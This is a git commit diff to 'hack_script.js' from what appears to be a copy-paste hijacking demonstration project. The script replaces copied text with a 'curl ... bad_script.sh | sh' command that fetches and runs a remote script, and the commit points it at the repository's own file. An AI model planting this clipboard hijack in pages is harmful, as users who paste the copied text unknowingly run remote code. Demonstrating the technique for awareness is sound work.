c497ad1ad12f86bf20283901528858eb6f158345
Marco Fantauzzo <marco97pa@live.it>
2022-01-05 16:31:58 +0100

    Online links
    Added links to the the GitHub repository

--- hack_script.js
+++ hack_script.js
@@ -1,7 +1,7 @@
 document.getElementById('copyme').addEventListener(
     'copy', function(e){
         e.clipboardData.setData('text/plain',
-        'curl http://mysite | sh\n');
+        'curl https://raw.githubusercontent.com/marco97pa/copy-paste-hack-js/master/bad_script.sh | sh\n');
         e.preventDefault();
     }
 )
